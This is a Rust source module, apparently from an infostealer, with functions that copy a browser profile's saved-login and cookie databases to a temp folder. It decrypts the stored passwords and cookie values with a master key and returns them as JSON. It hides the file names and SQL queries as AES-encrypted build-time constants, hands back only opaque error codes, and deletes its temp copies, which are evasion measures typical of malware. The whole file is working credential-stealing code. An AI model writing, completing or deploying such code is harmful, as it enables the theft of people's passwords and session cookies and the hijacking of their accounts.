
use std::{fs, path::Path};

use rusqlite::{Connection, OpenFlags};
use serde_json::{json, Value};

use crate::crypto;
use crate::xor::{aes_str, aes_dec};

mod dtb_aes {
    include!(concat!(env!("OUT_DIR"), "/dtb_aes_strings.rs"));
}

use dtb_aes::*;

pub fn extract_passwords(profile_dir: &Path, master_key: &[u8]) -> Result<Vec<Value>, String> {
    let master_key: &[u8; 32] = master_key.try_into().map_err(|_| "".to_string())?;
    let login_data_name = aes_str(LOGIN_DATA_CT, &LOGIN_DATA_KEY, &LOGIN_DATA_NONCE);
    let login_data = profile_dir.join(&login_data_name);

    use crate::xor::{TMPDB_LOGIN_CT, TMPDB_LOGIN_KEY, TMPDB_LOGIN_NONCE};
    let tmp_name = aes_str(TMPDB_LOGIN_CT, &TMPDB_LOGIN_KEY, &TMPDB_LOGIN_NONCE);
    let tmp = copy_db_to_temp(&login_data, &tmp_name)?;
    let conn = Connection::open_with_flags(
        &tmp,
        OpenFlags::SQLITE_OPEN_READ_ONLY | OpenFlags::SQLITE_OPEN_NO_MUTEX,
    )
    .map_err(|_| "e20")?;

    let sql_pw = aes_str(SQL_PASSWORDS_CT, &SQL_PASSWORDS_KEY, &SQL_PASSWORDS_NONCE);
    let mut stmt = conn
        .prepare(&sql_pw)
        .map_err(|_| "e21")?;

    let rows: Vec<Value> = stmt
        .query_map([], |row| {
            let url: String = row.get(0)?;
            let username: String = row.get(1)?;
            let enc_pass: Vec<u8> = row.get(2)?;
            Ok((url, username, enc_pass))
        })
        .map_err(|_| "e22")?
        .filter_map(|r| r.ok())
        .map(|(url, username, enc_pass)| {
            let password = if enc_pass.is_empty() {
                String::new()
            } else {
                match crypto::decrypt_value(&enc_pass, master_key) {
                    Ok(p) => p,
                    Err(_) => crypto::hex_fallback(&enc_pass),
                }
            };
            json!({
                "url": url,
                "username": username,
                "password": password,
            })
        })
        .collect();

    let _ = fs::remove_file(&tmp);
    Ok(rows)
}


pub fn extract_cookies(profile_dir: &Path, master_key: &[u8]) -> Result<Vec<Value>, String> {
    let master_key: &[u8; 32] = master_key.try_into().map_err(|_| "".to_string())?;
    let network_name  = aes_str(NETWORK_CT, &NETWORK_KEY, &NETWORK_NONCE);
    let cookies_name  = aes_str(COOKIES_CT, &COOKIES_KEY, &COOKIES_NONCE);
    let cookies_path = {
        let net = profile_dir.join(&network_name).join(&cookies_name);
        if net.exists() {
            net
        } else {
            profile_dir.join(&cookies_name)
        }
    };

    use crate::xor::{TMPDB_COOKIES_CT, TMPDB_COOKIES_KEY, TMPDB_COOKIES_NONCE};
    let tmp_name_c = aes_str(TMPDB_COOKIES_CT, &TMPDB_COOKIES_KEY, &TMPDB_COOKIES_NONCE);
    let tmp = copy_db_to_temp(&cookies_path, &tmp_name_c)?;
    let conn = Connection::open_with_flags(
        &tmp,
        OpenFlags::SQLITE_OPEN_READ_ONLY | OpenFlags::SQLITE_OPEN_NO_MUTEX,
    )
    .map_err(|_| "e23")?;

    let sql_ck = aes_str(SQL_COOKIES_CT, &SQL_COOKIES_KEY, &SQL_COOKIES_NONCE);
    let mut stmt = conn
        .prepare(&sql_ck)
        .map_err(|_| "e24")?;

    let rows: Vec<Value> = stmt
        .query_map([], |row| {
            let host: String = row.get(0)?;
            let name: String = row.get(1)?;
            let enc_val: Vec<u8> = row.get(2)?;
            let path: String = row.get(3)?;
            Ok((host, name, enc_val, path))
        })
        .map_err(|_| "e25")?
        .filter_map(|r| r.ok())
        .map(|(host, name, enc_val, path)| {
            let value = if enc_val.is_empty() {
                String::new()
            } else {
                match crypto::decrypt_value(&enc_val, master_key) {
                    Ok(v) => v,
                    Err(_) => crypto::hex_fallback(&enc_val),
                }
            };
            json!({
                "host": host,
                "name": name,
                "value": value,
                "path": path,
            })
        })
        .collect();

    let _ = fs::remove_file(&tmp);
    Ok(rows)
}


fn copy_db_to_temp(src: &Path, tmp_name: &str) -> Result<std::path::PathBuf, String> {
    let tmp = std::env::temp_dir().join(tmp_name);

    for attempt in 1..=3 {
        match fs::copy(src, &tmp) {
            Ok(_) => return Ok(tmp),
            Err(e) if attempt < 3 => {
                std::thread::sleep(std::time::Duration::from_millis(500 * attempt));
            }
            Err(_) => return Err("e26".into()),
        }
    }
    unreachable!()
}
